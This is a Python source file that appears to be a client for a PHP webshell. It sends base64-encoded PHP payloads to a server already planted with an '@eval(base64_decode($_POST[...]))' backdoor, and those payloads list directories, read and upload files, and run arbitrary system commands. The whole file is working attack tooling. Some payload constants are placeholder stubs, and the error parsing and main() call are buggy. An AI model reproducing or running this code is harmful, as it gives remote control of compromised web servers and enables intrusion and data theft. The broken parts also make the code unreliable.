from .sword import Sender
import os
import base64

PHP_MAKE='@eval\u0001(base64_decode($_POST[action]));'
PHP_INDEX="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpID8gQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKSA6ICIiO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKSA/IEBwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKSA6ICIiOyR1c3I9KCR1KSA/ICR1WyJuYW1lIl0gOiBAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Ilx0eyR1c3J9IjtwcmludCAkUjtlY2hvKCJ8PC0iKTtkaWUoKTs="
PHP_READDICT="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpID8gQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKSA6ICIiO2VjaG8oIi0+fCIpOyREPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCAkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7"
PHP_READFILE="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpID8gQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKSA6ICIiO2VjaG8oIi0+fCIpOyRGPWdldF9tYWdpY19xdW90ZXNfZ3BjKCk/YmFzZTY0X2RlY29kZShzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6MSJdKSk6YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRmcD1AZm9wZW4oJEYsInIiKTtpZihAZmdldGMoJGZwKSl7QGZjbG9zZSgkZnApO0ByZWFkZmlsZSgkRik7fWVsc2V7ZWNobygiRVJST1I6Ly8gQ2FuIE5vdCBSZWFkIik7fTtlY2hvKCJ8PC0iKTtkaWUoKTs="
PHP_SAVEFILE="D"
PHP_DELETE="E"
PHP_RENAME="I"
PHP_RETIME="K"
PHP_NEWDICT="J"
PHP_UPLOAD="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpID8gQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKSA6ICIiO2VjaG8oIi0+fCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs="
PHP_DOWNLOAD="F"
PHP_SHELL="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpID8gQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKSA6ICIiO2VjaG8oIi0+fCIpOyRwPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskcz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iO0BzeXN0ZW0oJHIuIiAyPiYxIiwkcmV0KTtwcmludCAoJHJldCE9MCk/IgpyZXQ9eyRyZXR9CiI6IiI7O2VjaG8oInw8LSIpO2RpZSgpOw=="


class Php(Sender):

    def send(self, **kargs):
        kargs.update({self.key : PHP_MAKE})
        if 'z1' in kargs:
            kargs['z1'] = base64.b64encode(kargs['z1'].encode()).decode()
        if 'z2' in kargs:
            kargs['z2'] = base64.b64encode(kargs['z2'].encode()).decode()
        if 'z3' in kargs:
            kargs['z3'] = base64.b64encode(kargs['z3'].encode()).decode()
            
        return super().send(**kargs)

    def init(self):
        self.index()
        self.show() 

    def index(self):
        self.os_info = ''
        self.cur_user = ''
        self.pwd, dir_tree, self.os_info, self.cur_user = self.send(action=PHP_INDEX).split("\t")
        dirs = self.ls(self.pwd)
        print(dir_tree)
        self.select_now = dirs[0]
        return self.pwd

    def ls(self, path, no_cd=False):
        files = [i.split("\t") for i in self.send(action=PHP_READDICT, z1=path).split('\n')]
        if not no_cd:
            self.now_dirs = {i[0]:i for i in files}
            return list(self.now_dirs.keys())
        else:
            return [i[0] for i in files]


    def readfile(self, file):
        return self.send(action=PHP_READFILE, z1=file)

    def upload(self, file):
        fname = os.path.basename(file)
        content = ""
        with open(file, 'rb') as fp:
            content = base64.b64encode(fp.read()).decode()

        dname = os.path.join(self.pwd, fname)
        return self.send(action=PHP_UPLOAD, z1=dname, z2=content)

    def cmd(self, cmd):
        c = '/bin/sh'
        shell = "cd  \"" + self.pwd + "\";" + cmd
        if self.os_info == 'win':
            c = 'cmd'
            shell = "cd  /d \"" + self.pwd + "\"&" + cmd
        res =  self.send(action=PHP_SHELL, z1=c, z2=shell)
        if "ret=" in res:
            err = res.split("res=")[0]
        else:
            err = ''

        return res, err

    def if_is_dir(self, select_now):
        # print(self.now_dirs, select_now)
        # if self.now_dirs[select_now][2] == '4096' and 'R' in self.now_dirs[select_now][3]:
        if select_now[-1] == '/' or select_now[-1] == '\\':
            return True
        return False





def main(args):
    j = Php(args.target, args.passwd)
    j.run()

if __name__ == '__main__':
    main()
